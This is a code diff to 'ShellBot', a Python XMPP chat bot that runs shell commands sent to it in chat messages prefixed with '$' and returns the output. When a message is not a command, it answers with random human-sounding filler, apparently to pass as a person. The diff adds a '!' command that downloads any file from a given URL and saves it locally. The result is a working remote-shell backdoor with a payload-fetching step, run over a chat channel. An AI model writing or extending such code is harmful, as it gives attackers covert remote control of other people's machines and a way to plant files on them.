@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-# ShellBot v0.1
+# ShellBot v0.2
 # Code heavily borrowed from SleekXMPP's MUCBot 
 # https://github.com/fritzy/SleekXMPP/blob/develop/examples/muc.py
 
@@ -8,6 +8,7 @@ import time, random
 import sys, os, subprocess
 import logging
 import getpass
+import urllib2
 from optparse import OptionParser
 import sleekxmpp
 
@@ -15,6 +16,7 @@ import sleekxmpp
 # https://www.google.com/settings/security/lesssecureapps
 USERNAME = 'example@gmail.com'
 CMD_TOKEN = '$'
+DWNLD_TOKEN = '!'
 #SHELLCHAT = ''
 #SHELLNIC = ''
 
@@ -61,10 +63,14 @@ class MUCBot(sleekxmpp.ClientXMPP):
       if body and body[0] == CMD_TOKEN:
         reply = self.run_command(body.lstrip(CMD_TOKEN))
         msg.reply(reply).send()
-      else:
-        time.sleep(random.uniform(0.4, 2.45))
-        reply = random.choice(['what?', 'huh..', 'mmmmm', 'I don\'t get it'])
-        msg.reply(reply).send()
+        return
+      if body and body[0] == DWNLD_TOKEN:
+        self.download(body.lstrip(DWNLD_TOKEN))
+        msg.reply("file saved to: "+body.lstrip(DWNLD_TOKEN).split('/')[-1]).send()
+        return
+      time.sleep(random.uniform(0.4, 2.45))
+      reply = random.choice(['what?', 'huh..', 'mmmmm', 'I don\'t get it'])
+      msg.reply(reply).send()
 
   # reply to nick_name mentions
   def muc_message(self, msg):
@@ -86,6 +92,15 @@ class MUCBot(sleekxmpp.ClientXMPP):
       stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     stdoutput = proc.stdout.read() + proc.stderr.read()
     return stdoutput
+
+  def download(self, url):
+    #Grab our file from some url and save it to a file
+    req = urllib2.Request('%s' % (url))
+    message = urllib2.urlopen(req)
+    filename = url.split('/')[-1]
+    localFile = open(filename, 'w')
+    localFile.write(message.read())
+    localFile.close()
 
 
 def main():
